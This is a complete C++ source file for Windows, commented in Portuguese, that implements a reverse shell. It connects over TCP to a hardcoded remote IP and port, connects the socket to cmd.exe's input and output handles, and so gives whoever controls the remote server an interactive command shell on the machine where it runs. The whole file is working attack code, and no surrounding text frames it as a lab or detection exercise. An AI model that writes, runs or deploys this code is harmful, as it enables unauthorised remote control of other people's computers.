#include <iostream>
#include <winsock2.h>
#include <windows.h>

int main(void) {
    SOCKET clientSocket;
    sockaddr_in serverAddress;
    WSADATA wsaData;
    STARTUPINFOW startupInfo;
    PROCESS_INFORMATION processInfo;

    char receivedData[1024];
    char ipAddress[] = "172.19.56.74"; // Endereço IP do servidor remoto
    int port = 5068; // Porta usada para a conexão com o servidor

    // Inicialize a biblioteca Winsock (WSA)
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Erro ao inicializar a biblioteca Winsock (WSA)" << std::endl;
        return 1; // Saia do programa com erro
    }

    // Cria um socket para a comunicação
    clientSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(port);
    serverAddress.sin_addr.s_addr = inet_addr(ipAddress);

    // Estabelece a conexão com o servidor
    if (connect(clientSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "[!] ERRO AO SE CONECTAR AO SERVIDOR" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    recv(clientSocket, receivedData, sizeof(receivedData), 0);
    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ZeroMemory(&processInfo, sizeof(processInfo));

    // Configura as configurações de inicialização do processo
    startupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)clientSocket;
    wchar_t command[] = L"cmd.exe"; // Comando que será executado na máquina remota

    // Cria um processo remoto (shell do Windows) na máquina remota
    if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        std::cerr << "Erro ao criar o processo remoto" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // Aguarda até que o processo remoto termine
    WaitForSingleObject(processInfo.hProcess, INFINITE);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    // Fecha o socket e encerra a biblioteca Winsock
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
